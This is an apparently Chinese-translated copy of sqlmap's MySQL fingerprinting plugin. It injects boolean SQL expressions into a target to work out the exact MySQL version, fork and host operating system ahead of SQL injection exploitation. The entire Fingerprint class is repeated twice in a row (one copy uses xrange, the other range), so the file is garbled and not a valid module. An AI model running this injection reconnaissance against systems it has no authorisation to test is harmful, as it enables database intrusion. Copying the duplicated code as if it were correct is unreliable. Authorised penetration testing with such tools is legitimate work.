#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.common import Backend
from lib.core.common import Format
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.compat import xrange
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import FORK
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import MYSQL_ALIASES
from lib.request import inject
from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.MYSQL)

    def _commentCheck(self):
        infoMsg = "执行 %s 注释注入指纹识别" % DBMS.MYSQL
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/* NoValue */")

        if not result:
            warnMsg = "无法执行 %s 注释注入" % DBMS.MYSQL
            logger.warning(warnMsg)

            return None

        # 参考:https://downloads.mysql.com/archives/community/
        # 参考:https://dev.mysql.com/doc/relnotes/mysql/<major>.<minor>/en/

        versions = (
            (80100, 80102),  # MySQL 8.1
            (80000, 80035),  # MySQL 8.0
            (60000, 60014),  # MySQL 6.0
            (50700, 50744),  # MySQL 5.7
            (50600, 50652),  # MySQL 5.6
            (50500, 50563),  # MySQL 5.5
            (50400, 50404),  # MySQL 5.4
            (50100, 50174),  # MySQL 5.1
            (50000, 50097),  # MySQL 5.0
            (40100, 40131),  # MySQL 4.1
            (40000, 40032),  # MySQL 4.0
            (32300, 32359),  # MySQL 3.23
            (32200, 32235),  # MySQL 3.22
        )

        found = False
        for candidate in versions:
            result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%d AND [RANDNUM1]=[RANDNUM2]*/" % candidate[0])

            if not result:
                found = True
                break

        if found:
            for version in xrange(candidate[1], candidate[0] - 1, -1):
                version = getUnicode(version)
                result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM1]=[RANDNUM2]*/" % version)

                if not result:
                    if version[0] == "3":
                        midVer = version[1:3]
                    else:
                        midVer = version[2]

                    trueVer = "%s.%s.%s" % (version[0], midVer, version[3:])

                    return trueVer

        return None

    def getFingerprint(self):
        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)

        if fork is None:
            if inject.checkBooleanExpression("VERSION() LIKE '%MariaDB%'"):
                fork = FORK.MARIADB
            elif inject.checkBooleanExpression("VERSION() LIKE '%TiDB%'"):
                fork = FORK.TIDB
            elif inject.checkBooleanExpression("VERSION_COMMENT LIKE '%drizzle%'"):
                fork = FORK.DRIZZLE
            elif inject.checkBooleanExpression("VERSION_COMMENT LIKE '%Percona%'"):
                fork = FORK.PERCONA
            elif inject.checkBooleanExpression("AURORA_VERSION() LIKE '%'"):            # 参考:https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/
                fork = FORK.AURORA
            else:
                fork = ""

            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)

        value = ""
        wsOsFp = Format.getOs("Web服务器", kb.headersFp)

        if wsOsFp and not conf.api:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("后端 DBMS", kb.bannerFp)

            if dbmsOsFp and not conf.api:
                value += "%s\n" % dbmsOsFp

        value += "后端 DBMS: "
        actVer = Format.getDbms()

        if not conf.extensiveFp:
            value += actVer
            if fork:
                value += " (%s fork)" % fork
            return value

        comVer = self._commentCheck()
        blank = " " * 15
        value += "活动指纹: %s" % actVer

        if comVer:
            comVer = Format.getDbms([comVer])
            value += "\n%s注释注入指纹: %s" % (blank, comVer)

        if kb.bannerFp:
            banVer = kb.bannerFp.get("dbmsVersion")

            if banVer:
                if banVer and re.search(r"-log$", kb.data.banner or ""):
                    banVer += ", 启用日志记录"

                banVer = Format.getDbms([banVer])
                value += "\n%s横幅解析指纹: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%sHTML 错误消息指纹: %s" % (blank, htmlErrorFp)

        if fork:
            value += "\n%s分支指纹: %s" % (blank, fork)

        return value

    def checkDbms(self):
        """
        指纹识别参考:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html (up to 5.0.89)
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html (up to 5.1.42)
        * http://dev.mysql.com/doc/refman/5.4/en/news-5-4-x.html (up to 5.4.4)
        * http://dev.mysql.com/doc/refman/5.5/en/news-5-5-x.html (up to 5.5.0)
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html (manual has been withdrawn)
        """

        if not conf.extensiveFp and Backend.isDbmsWithin(MYSQL_ALIASES):
            setDbms("%s %s" % (DBMS.MYSQL, Backend.getVersion()))

            if Backend.isVersionGreaterOrEqualThan("5") or inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                kb.data.has_information_schema = True
            self.getBanner()

            return True

        infoMsg = "测试 %s" % DBMS.MYSQL
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("QUARTER(NULL XOR NULL) IS NULL")

        if result:
            infoMsg = "确认 %s" % DBMS.MYSQL
            logger.info(infoMsg)

            result = inject.checkBooleanExpression("SESSION_USER() LIKE USER()")

            if not result:
                # 注意:MemSQL 不支持 SESSION_USER()
                result = inject.checkBooleanExpression("GEOGRAPHY_AREA(NULL) IS NULL")

                if result:
                    hashDBWrite(HASHDB_KEYS.DBMS_FORK, FORK.MEMSQL)

            if not result:
                warnMsg = "后端 DBMS 不是 %s" % DBMS.MYSQL
                logger.warning(warnMsg)

                return False

            # 在某些平台上读取 information_schema 会导致烦人的超时退出
            # 参考:http://bugs.mysql.com/bug.php?id=15855

            kb.data.has_information_schema = True

            # 判断是否为 MySQL >= 8.0.0
            if inject.checkBooleanExpression("ISNULL(JSON_STORAGE_FREE(NULL))"):
                Backend.setVersion(">= 8.0.0")
                setDbms("%s 8" % DBMS.MYSQL)
                self.getBanner()

            # 判断是否为 MySQL >= 5.0.0
            elif inject.checkBooleanExpression("ISNULL(TIMESTAMPADD(MINUTE,[RANDNUM],NULL))"):
                Backend.setVersion(">= 5.0.0")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

                if not conf.extensiveFp:
                    return True

                infoMsg = "主动指纹识别 %s" % DBMS.MYSQL
                logger.info(infoMsg)

                # 检查是否为 MySQL >= 5.7
                if inject.checkBooleanExpression("ISNULL(JSON_QUOTE(NULL))"):
                    Backend.setVersion(">= 5.7")

                # 检查是否为 MySQL >= 5.6
                elif inject.checkBooleanExpression("ISNULL(VALIDATE_PASSWORD_STRENGTH(NULL))"):
                    Backend.setVersion(">= 5.6")

                # 检查是否为 MySQL >= 5.5
                elif inject.checkBooleanExpression("TO_SECONDS(950501)>0"):
                    Backend.setVersion(">= 5.5")

                # 检查是否为 MySQL >= 5.1.2 且 < 5.5.0
                elif inject.checkBooleanExpression("table_open_cache=table_open_cache"):
                    if inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.GLOBAL_STATUS LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.12", "< 5.5.0"])
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PROCESSLIST LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.7", "< 5.1.12"])
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PARTITIONS LIMIT 0, 1)"):
                        Backend.setVersion("= 5.1.6")
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PLUGINS LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.5", "< 5.1.6"])
                    else:
                        Backend.setVersionList([">= 5.1.2", "< 5.1.5"])

                # 检查是否为 MySQL >= 5.0.0 且 < 5.1.2
                elif inject.checkBooleanExpression("hostname=hostname"):
                    Backend.setVersionList([">= 5.0.38", "< 5.1.2"])
                elif inject.checkBooleanExpression("character_set_filesystem=character_set_filesystem"):
                    Backend.setVersionList([">= 5.0.19", "< 5.0.38"])
                elif not inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM DUAL WHERE [RANDNUM1]!=[RANDNUM2])"):
                    Backend.setVersionList([">= 5.0.11", "< 5.0.19"])
                elif inject.checkBooleanExpression("div_precision_increment=div_precision_increment"):
                    Backend.setVersionList([">= 5.0.6", "< 5.0.11"])
                elif inject.checkBooleanExpression("automatic_sp_privileges=automatic_sp_privileges"):
                    Backend.setVersionList([">= 5.0.3", "< 5.0.6"])
                else:
                    Backend.setVersionList([">= 5.0.0", "< 5.0.3"])

            elif inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                Backend.setVersion(">= 5.0.2")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

            elif inject.checkBooleanExpression("STRCMP(LOWER(CURRENT_USER()), UPPER(CURRENT_USER()))=0"):
                Backend.setVersion("< 5.0.0")
                setDbms("%s 4" % DBMS.MYSQL)
                self.getBanner()

                kb.data.has_information_schema = False

                if not conf.extensiveFp:
                    return True

                # 检查 MySQL < 5.0.0 的具体版本
                if inject.checkBooleanExpression("3=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.11", "< 5.0.0"])
                elif inject.checkBooleanExpression("2=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.1", "< 4.1.11"])
                elif inject.checkBooleanExpression("CURRENT_USER()=CURRENT_USER()"):
                    Backend.setVersionList([">= 4.0.6", "< 4.1.1"])

                    if inject.checkBooleanExpression("'utf8'=(SELECT CHARSET(CURRENT_USER()))"):
                        Backend.setVersion("= 4.1.0")
                    else:
                        Backend.setVersionList([">= 4.0.6", "< 4.1.0"])
                else:
                    Backend.setVersionList([">= 4.0.0", "< 4.0.6"])
            else:
                Backend.setVersion("< 4.0.0")
                setDbms("%s 3" % DBMS.MYSQL)
                self.getBanner()

                kb.data.has_information_schema = False

            return True
        else:
            warnMsg = "后端 DBMS 不是 %s" % DBMS.MYSQL
            logger.warning(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "指纹识别后端 DBMS 操作系统"
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("'W'=UPPER(MID(version_compile_os,1,1))")

        if result:
            Backend.setOs(OS.WINDOWS)
        elif not result:
            Backend.setOs(OS.LINUX)

        if Backend.getOs():
            infoMsg = "后端 DBMS 操作系统为 %s" % Backend.getOs()
            logger.info(infoMsg)
        else:
            self.userChooseDbmsOs()

        self.cleanup(onlyFileTbl=True)
class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.MYSQL)

    def _commentCheck(self):
        infoMsg = "执行 %s 注释注入指纹识别" % DBMS.MYSQL
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/* NoValue */")

        if not result:
            warnMsg = "无法执行 %s 注释注入" % DBMS.MYSQL
            logger.warning(warnMsg)

            return None

        # 参考:https://downloads.mysql.com/archives/community/
        # 参考:https://dev.mysql.com/doc/relnotes/mysql/<major>.<minor>/en/

        versions = (
            (80100, 80102),  # MySQL 8.1
            (80000, 80035),  # MySQL 8.0
            (60000, 60014),  # MySQL 6.0
            (50700, 50744),  # MySQL 5.7
            (50600, 50652),  # MySQL 5.6
            (50500, 50563),  # MySQL 5.5
            (50400, 50404),  # MySQL 5.4
            (50100, 50174),  # MySQL 5.1
            (50000, 50097),  # MySQL 5.0
            (40100, 40131),  # MySQL 4.1
            (40000, 40032),  # MySQL 4.0
            (32300, 32359),  # MySQL 3.23
            (32200, 32235),  # MySQL 3.22
        )

        found = False
        for candidate in versions:
            result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%d AND [RANDNUM1]=[RANDNUM2]*/" % candidate[0])

            if not result:
                found = True
                break

        if found:
            for version in range(candidate[1], candidate[0] - 1, -1):
                version = getUnicode(version)
                result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM1]=[RANDNUM2]*/" % version)

                if not result:
                    if version[0] == "3":
                        midVer = version[1:3]
                    else:
                        midVer = version[2]

                    trueVer = "%s.%s.%s" % (version[0], midVer, version[3:])

                    return trueVer

        return None

    def getFingerprint(self):
        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)

        if fork is None:
            if inject.checkBooleanExpression("VERSION() LIKE '%MariaDB%'"):
                fork = FORK.MARIADB
            elif inject.checkBooleanExpression("VERSION() LIKE '%TiDB%'"):
                fork = FORK.TIDB
            elif inject.checkBooleanExpression("VERSION_COMMENT LIKE '%drizzle%'"):
                fork = FORK.DRIZZLE
            elif inject.checkBooleanExpression("VERSION_COMMENT LIKE '%Percona%'"):
                fork = FORK.PERCONA
            elif inject.checkBooleanExpression("AURORA_VERSION() LIKE '%'"):            # 参考:https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/
                fork = FORK.AURORA
            else:
                fork = ""

            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)

        value = ""
        wsOsFp = Format.getOs("Web服务器", kb.headersFp)

        if wsOsFp and not conf.api:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("后端 DBMS", kb.bannerFp)

            if dbmsOsFp and not conf.api:
                value += "%s\n" % dbmsOsFp

        value += "后端 DBMS: "
        actVer = Format.getDbms()

        if not conf.extensiveFp:
            value += actVer
            if fork:
                value += " (%s fork)" % fork
            return value

        comVer = self._commentCheck()
        blank = " " * 15
        value += "活动指纹: %s" % actVer

        if comVer:
            comVer = Format.getDbms([comVer])
            value += "\n%s注释注入指纹: %s" % (blank, comVer)

        if kb.bannerFp:
            banVer = kb.bannerFp.get("dbmsVersion")

            if banVer:
                if banVer and re.search(r"-log$", kb.data.banner or ""):
                    banVer += ", 启用日志记录"

                banVer = Format.getDbms([banVer])
                value += "\n%s横幅解析指纹: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%sHTML 错误消息指纹: %s" % (blank, htmlErrorFp)

        if fork:
            value += "\n%s分支指纹: %s" % (blank, fork)

        return value

    def checkDbms(self):
        """
        指纹识别参考:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html (up to 5.0.89)
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html (up to 5.1.42)
        * http://dev.mysql.com/doc/refman/5.4/en/news-5-4-x.html (up to 5.4.4)
        * http://dev.mysql.com/doc/refman/5.5/en/news-5-5-x.html (up to 5.5.0)
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html (manual has been withdrawn)
        """

        if not conf.extensiveFp and Backend.isDbmsWithin(MYSQL_ALIASES):
            setDbms("%s %s" % (DBMS.MYSQL, Backend.getVersion()))

            if Backend.isVersionGreaterOrEqualThan("5") or inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                kb.data.has_information_schema = True
            self.getBanner()

            return True

        infoMsg = "测试 %s" % DBMS.MYSQL
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("QUARTER(NULL XOR NULL) IS NULL")

        if result:
            infoMsg = "确认 %s" % DBMS.MYSQL
            logger.info(infoMsg)

            result = inject.checkBooleanExpression("SESSION_USER() LIKE USER()")

            if not result:
                # 注意:MemSQL 不支持 SESSION_USER()
                result = inject.checkBooleanExpression("GEOGRAPHY_AREA(NULL) IS NULL")

                if result:
                    hashDBWrite(HASHDB_KEYS.DBMS_FORK, FORK.MEMSQL)

            if not result:
                warnMsg = "后端 DBMS 不是 %s" % DBMS.MYSQL
                logger.warning(warnMsg)

                return False

            # 在某些平台上读取 information_schema 会导致烦人的超时退出
            # 参考:http://bugs.mysql.com/bug.php?id=15855

            kb.data.has_information_schema = True

            # 判断是否为 MySQL >= 8.0.0
            if inject.checkBooleanExpression("ISNULL(JSON_STORAGE_FREE(NULL))"):
                Backend.setVersion(">= 8.0.0")
                setDbms("%s 8" % DBMS.MYSQL)
                self.getBanner()

            # 判断是否为 MySQL >= 5.0.0
            elif inject.checkBooleanExpression("ISNULL(TIMESTAMPADD(MINUTE,[RANDNUM],NULL))"):
                Backend.setVersion(">= 5.0.0")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

                if not conf.extensiveFp:
                    return True

                infoMsg = "主动指纹识别 %s" % DBMS.MYSQL
                logger.info(infoMsg)

                # 检查是否为 MySQL >= 5.7
                if inject.checkBooleanExpression("ISNULL(JSON_QUOTE(NULL))"):
                    Backend.setVersion(">= 5.7")

                # 检查是否为 MySQL >= 5.6
                elif inject.checkBooleanExpression("ISNULL(VALIDATE_PASSWORD_STRENGTH(NULL))"):
                    Backend.setVersion(">= 5.6")

                # 检查是否为 MySQL >= 5.5
                elif inject.checkBooleanExpression("TO_SECONDS(950501)>0"):
                    Backend.setVersion(">= 5.5")

                # 检查是否为 MySQL >= 5.1.2 且 < 5.5.0
                elif inject.checkBooleanExpression("table_open_cache=table_open_cache"):
                    if inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.GLOBAL_STATUS LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.12", "< 5.5.0"])
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PROCESSLIST LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.7", "< 5.1.12"])
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PARTITIONS LIMIT 0, 1)"):
                        Backend.setVersion("= 5.1.6")
                    elif inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PLUGINS LIMIT 0, 1)"):
                        Backend.setVersionList([">= 5.1.5", "< 5.1.6"])
                    else:
                        Backend.setVersionList([">= 5.1.2", "< 5.1.5"])

                # 检查是否为 MySQL >= 5.0.0 且 < 5.1.2
                elif inject.checkBooleanExpression("hostname=hostname"):
                    Backend.setVersionList([">= 5.0.38", "< 5.1.2"])
                elif inject.checkBooleanExpression("character_set_filesystem=character_set_filesystem"):
                    Backend.setVersionList([">= 5.0.19", "< 5.0.38"])
                elif not inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM DUAL WHERE [RANDNUM1]!=[RANDNUM2])"):
                    Backend.setVersionList([">= 5.0.11", "< 5.0.19"])
                elif inject.checkBooleanExpression("div_precision_increment=div_precision_increment"):
                    Backend.setVersionList([">= 5.0.6", "< 5.0.11"])
                elif inject.checkBooleanExpression("automatic_sp_privileges=automatic_sp_privileges"):
                    Backend.setVersionList([">= 5.0.3", "< 5.0.6"])
                else:
                    Backend.setVersionList([">= 5.0.0", "< 5.0.3"])

            elif inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                Backend.setVersion(">= 5.0.2")
                setDbms("%s 5" % DBMS.MYSQL)
                self.getBanner()

            elif inject.checkBooleanExpression("STRCMP(LOWER(CURRENT_USER()), UPPER(CURRENT_USER()))=0"):
                Backend.setVersion("< 5.0.0")
                setDbms("%s 4" % DBMS.MYSQL)
                self.getBanner()

                kb.data.has_information_schema = False

                if not conf.extensiveFp:
                    return True

                # 检查 MySQL < 5.0.0 的具体版本
                if inject.checkBooleanExpression("3=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.11", "< 5.0.0"])
                elif inject.checkBooleanExpression("2=(SELECT COERCIBILITY(USER()))"):
                    Backend.setVersionList([">= 4.1.1", "< 4.1.11"])
                elif inject.checkBooleanExpression("CURRENT_USER()=CURRENT_USER()"):
                    Backend.setVersionList([">= 4.0.6", "< 4.1.1"])

                    if inject.checkBooleanExpression("'utf8'=(SELECT CHARSET(CURRENT_USER()))"):
                        Backend.setVersion("= 4.1.0")
                    else:
                        Backend.setVersionList([">= 4.0.6", "< 4.1.0"])
                else:
                    Backend.setVersionList([">= 4.0.0", "< 4.0.6"])
            else:
                Backend.setVersion("< 4.0.0")
                setDbms("%s 3" % DBMS.MYSQL)
                self.getBanner()

                kb.data.has_information_schema = False

            return True
        else:
            warnMsg = "后端 DBMS 不是 %s" % DBMS.MYSQL
            logger.warning(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "指纹识别后端 DBMS 操作系统"
        logger.info(infoMsg)

        result = inject.checkBooleanExpression("'W'=UPPER(MID(version_compile_os,1,1))")

        if result:
            Backend.setOs(OS.WINDOWS)
        elif not result:
            Backend.setOs(OS.LINUX)

        if Backend.getOs():
            infoMsg = "后端 DBMS 操作系统为 %s" % Backend.getOs()
            logger.info(infoMsg)
        else:
            self.userChooseDbmsOs()

        self.cleanup(onlyFileTbl=True)